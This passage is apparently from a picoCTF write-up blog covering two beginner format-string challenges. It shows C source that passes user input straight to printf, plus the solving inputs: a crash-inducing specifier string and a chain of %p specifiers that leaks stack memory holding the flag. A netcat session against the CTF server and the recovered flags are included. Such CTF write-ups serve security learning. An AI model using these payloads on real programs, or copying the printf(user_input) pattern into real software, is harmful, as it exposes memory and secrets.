</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 89</span><span>    <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 90</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 91</span><span>    <span style="color:#f38ba8">char</span> choice2[BUFSIZE];
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 92</span><span>    <span style="color:#89b4fa">scanf</span>(<span style="color:#a6e3a1">&#34;%s&#34;</span>, choice2);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 93</span><span>    <span style="color:#f38ba8">char</span> <span style="color:#89dceb;font-weight:bold">*</span>menu2[<span style="color:#fab387">3</span>] <span style="color:#89dceb;font-weight:bold">=</span> {<span style="color:#a6e3a1">&#34;Pe%to_Portobello&#34;</span>, <span style="color:#a6e3a1">&#34;$outhwest_Burger&#34;</span>, <span style="color:#a6e3a1">&#34;Cla%sic_Che%s%steak&#34;</span>};
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 94</span><span>    <span style="color:#cba6f7">if</span> (<span style="color:#89dceb;font-weight:bold">!</span><span style="color:#89b4fa">on_menu</span>(choice2, menu2, <span style="color:#fab387">3</span>)) {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 95</span><span>        <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;%s&#34;</span>, <span style="color:#a6e3a1">&#34;There is no such burger yet!</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 96</span><span>        <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 97</span><span>    } <span style="color:#cba6f7">else</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 98</span><span>        <span style="color:#89b4fa">printf</span>(choice2);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 99</span><span>        <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">100</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">101</span><span>}</span></span></code></pre></div>
<br>
<p><strong><em>Hint</em></strong>: This is an introduction of format string vulnerabilities. Look up <code>format specifiers</code> if you have never seen them before.</p>
<table>
<thead>
<tr>
<th style="text-align:center">Format Specifier</th>
<th style="text-align:center">Type</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">%c</td>
<td style="text-align:center">Character</td>
</tr>
<tr>
<td style="text-align:center">%d</td>
<td style="text-align:center">Signed integer</td>
</tr>
<tr>
<td style="text-align:center">%e or %E</td>
<td style="text-align:center">Scientific notation of floats</td>
</tr>
<tr>
<td style="text-align:center">%f</td>
<td style="text-align:center">Float values</td>
</tr>
<tr>
<td style="text-align:center">%g or %G</td>
<td style="text-align:center">Similar as %e or %E</td>
</tr>
<tr>
<td style="text-align:center">%hi</td>
<td style="text-align:center">Signed integer (short)</td>
</tr>
<tr>
<td style="text-align:center">%hu</td>
<td style="text-align:center">UnSigned integer (short)</td>
</tr>
<tr>
<td style="text-align:center">%i</td>
<td style="text-align:center">Unsigned integer</td>
</tr>
<tr>
<td style="text-align:center">%l or %ld or %li</td>
<td style="text-align:center">Long</td>
</tr>
<tr>
<td style="text-align:center">%lf</td>
<td style="text-align:center">Double</td>
</tr>
<tr>
<td style="text-align:center">%Lf</td>
<td style="text-align:center">Long Double</td>
</tr>
<tr>
<td style="text-align:center">%lu</td>
<td style="text-align:center">Unsigned int or unsigned long</td>
</tr>
<tr>
<td style="text-align:center">%lli or %lld</td>
<td style="text-align:center">Long long</td>
</tr>
<tr>
<td style="text-align:center">%llu</td>
<td style="text-align:center">Unsigned long long</td>
</tr>
<tr>
<td style="text-align:center">%o</td>
<td style="text-align:center">Octal representation</td>
</tr>
<tr>
<td style="text-align:center">%p</td>
<td style="text-align:center">Pointer</td>
</tr>
<tr>
<td style="text-align:center">%s</td>
<td style="text-align:center">String</td>
</tr>
<tr>
<td style="text-align:center">%u</td>
<td style="text-align:center">Unsigned int</td>
</tr>
<tr>
<td style="text-align:center">%x or %X</td>
<td style="text-align:center">Hexadecimal representation</td>
</tr>
</tbody>
</table>
<br>
<h4 id="solution">Solution:</h4>
<p>When first asked to choose from the following burgers: <code>Breakf@st_Burger</code>, <code>Gr%114d_Cheese</code>, <code>Bac0n_D3luxe</code>, the only option with use of format specifier is <code>Gr%114d_Cheese</code>.</p>
<p>Again, we are asked to choose from the following burgers: <code>Pe%to_Portobello</code>, <code>$outhwest_Burger</code>, <code>Cla%sic_Che%s%steak</code>. However, the only option with the proper use of format specifier is <code>Cla%sic_Che%s%steak</code>. There is no format specifier such as <code>%t</code>. Inputting that would give us the flag.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>Welcome to our newly-opened burger place Pico <span style="color:#f38ba8">&#39;</span>n Patty! Can you <span style="color:#89dceb">help</span> the picky customers find their favorite burger?
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>Here comes the first customer Patrick who wants a giant bite.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Enter your recommendation: Gr%114d_Cheese
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Gr                                                                                                           4202954_Cheese
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Good job! Patrick is happy! Now can you serve the second customer?
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Sponge Bob wants something outrageous that would <span style="color:#89dceb">break</span> the shop <span style="color:#89dceb;font-weight:bold">(</span>better be served quick before the shop owner kicks you out!<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>Please choose from the following burgers: Pe%to_Portobello, <span style="color:#f5e0dc">$outhwest_Burger</span>, Cla%sic_Che%s%steak
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Enter your recommendation: Cla%sic_Che%s%steak
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>ClaCla%sic_Che%s%steakic_Che<span style="color:#89dceb;font-weight:bold">(</span>null<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>picoCTF<span style="color:#89dceb;font-weight:bold">{</span>7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<p><strong><em>flag</em></strong>: picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405}</p>
<hr>
<h3 id="format-string-1">format string 1</h3>
<p><em>Author: SYREAL</em></p>
<h3 id="description-1">Description</h3>
<p>Patrick and Sponge Bob were really happy with those orders you made for them, but now they&rsquo;re curious about the secret menu. Find it, and along the way, maybe you&rsquo;ll find something else of interest!</p>
<p>Here&rsquo;s the provided source code:</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#6c7086;font-style:italic">#include</span> <span style="color:#6c7086;font-weight:bold;font-style:italic">&lt;stdio.h&gt;</span><span style="color:#6c7086;font-style:italic">
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span><span style="color:#6c7086;font-style:italic"></span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#f38ba8">int</span> <span style="color:#89b4fa">main</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>  <span style="color:#f38ba8">char</span> buf[<span style="color:#fab387">1024</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>  <span style="color:#f38ba8">char</span> secret1[<span style="color:#fab387">64</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>  <span style="color:#f38ba8">char</span> flag[<span style="color:#fab387">64</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>  <span style="color:#f38ba8">char</span> secret2[<span style="color:#fab387">64</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>  <span style="color:#6c7086;font-style:italic">// Read in first secret menu item
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#6c7086;font-style:italic"></span>  FILE <span style="color:#89dceb;font-weight:bold">*</span>fd <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#89b4fa">fopen</span>(<span style="color:#a6e3a1">&#34;secret-menu-item-1.txt&#34;</span>, <span style="color:#a6e3a1">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>  <span style="color:#cba6f7">if</span> (fd <span style="color:#89dceb;font-weight:bold">==</span> <span style="color:#89dceb">NULL</span>){
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;&#39;secret-menu-item-1.txt&#39; file not found, aborting.</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>    <span style="color:#cba6f7">return</span> <span style="color:#fab387">1</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>  }
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>  <span style="color:#89b4fa">fgets</span>(secret1, <span style="color:#fab387">64</span>, fd);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>  <span style="color:#6c7086;font-style:italic">// Read in the flag
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span><span style="color:#6c7086;font-style:italic"></span>  fd <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#89b4fa">fopen</span>(<span style="color:#a6e3a1">&#34;flag.txt&#34;</span>, <span style="color:#a6e3a1">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>  <span style="color:#cba6f7">if</span> (fd <span style="color:#89dceb;font-weight:bold">==</span> <span style="color:#89dceb">NULL</span>){
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;&#39;flag.txt&#39; file not found, aborting.</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>    <span style="color:#cba6f7">return</span> <span style="color:#fab387">1</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>  }
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>  <span style="color:#89b4fa">fgets</span>(flag, <span style="color:#fab387">64</span>, fd);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>  <span style="color:#6c7086;font-style:italic">// Read in second secret menu item
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span><span style="color:#6c7086;font-style:italic"></span>  fd <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#89b4fa">fopen</span>(<span style="color:#a6e3a1">&#34;secret-menu-item-2.txt&#34;</span>, <span style="color:#a6e3a1">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>  <span style="color:#cba6f7">if</span> (fd <span style="color:#89dceb;font-weight:bold">==</span> <span style="color:#89dceb">NULL</span>){
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;&#39;secret-menu-item-2.txt&#39; file not found, aborting.</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>    <span style="color:#cba6f7">return</span> <span style="color:#fab387">1</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>  }
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">30</span><span>  <span style="color:#89b4fa">fgets</span>(secret2, <span style="color:#fab387">64</span>, fd);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">31</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">32</span><span>  <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;Give me your order and I&#39;ll read it back to you:</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">33</span><span>  <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">34</span><span>  <span style="color:#89b4fa">scanf</span>(<span style="color:#a6e3a1">&#34;%1024s&#34;</span>, buf);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">35</span><span>  <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;Here&#39;s your order: &#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">36</span><span>  <span style="color:#89b4fa">printf</span>(buf);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">37</span><span>  <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">38</span><span>  <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">39</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">40</span><span>  <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;Bye!</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">41</span><span>  <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">42</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">43</span><span>  <span style="color:#cba6f7">return</span> <span style="color:#fab387">0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">44</span><span>}</span></span></code></pre></div>
<br>
<p>We are going to input 18 values of <code>%p</code> format specifier with commas to get the relevant values. It outputted the following: <code>0x402118,(nil),0x73d0dde92a00,(nil),0x811880,0xa347834,0x7ffe00d7f2f0,0x73d0ddc83e60,0x73d0ddea84d0,0x1,0x7ffe00d7f3c0,(nil),(nil),0x7b4654436f636970,0x355f31346d316e34,0x3478345f33317937,0x35625f673431665f,0x7d663839623764,0x7,0x73d0ddeaa8d8,0x2300000007,0x206e693374307250,0xa336c797453,0x9</code></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>leewookb-picoctf@webshell:~$ nc mimas.picoctf.net <span style="color:#fab387">63473</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>Give me your order and I<span style="color:#a6e3a1">&#39;ll read it back to you:
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span><span style="color:#a6e3a1">%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span><span style="color:#a6e3a1">Here&#39;</span>s your order: 0x402118,<span style="color:#89dceb;font-weight:bold">(</span>nil<span style="color:#89dceb;font-weight:bold">)</span>,0x70368ca8ca00,<span style="color:#89dceb;font-weight:bold">(</span>nil<span style="color:#89dceb;font-weight:bold">)</span>,0x10b1880,0xa347834,0x7fffc0f31fe0,0x70368c87de60,0x70368caa24d0,0x1,0x7fffc0f320b0,<span style="color:#89dceb;font-weight:bold">(</span>nil<span style="color:#89dceb;font-weight:bold">)</span>,<span style="color:#89dceb;font-weight:bold">(</span>nil<span style="color:#89dceb;font-weight:bold">)</span>,0x7b4654436f636970,0x355f31346d316e34,0x3478345f33317937,0x31395f673431665f,0x7d653464663533
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>Bye!</span></span></code></pre></div>
<br>
<p>Copy and paste the returned value to <a href="https://gchq.github.io/CyberChef/" target="_blank">CyberChef</a> to convert hex values to text. Remove the first 13 values and that will leave us the values from 14th place to 18th place.</p>
<p><img src="image.png#center" alt="alt text"></p>
<br>
<p>As you could see, 14th to 18th values do represent the flag values but it&rsquo;s currently reversely written.</p>

  </content>
  
  <p>
    
    <a href="/blog/picoctf/">#picoCTF</a>&nbsp;&nbsp;
    
  </p>

    </main>
    <footer>
      

  <span>
    
    Made with
    <a href="https://github.com/maolonglong/hugo-simple/">Hugo ʕ•ᴥ•ʔ Simple</a>
  </span>


    </footer>

    
</body>
</html>
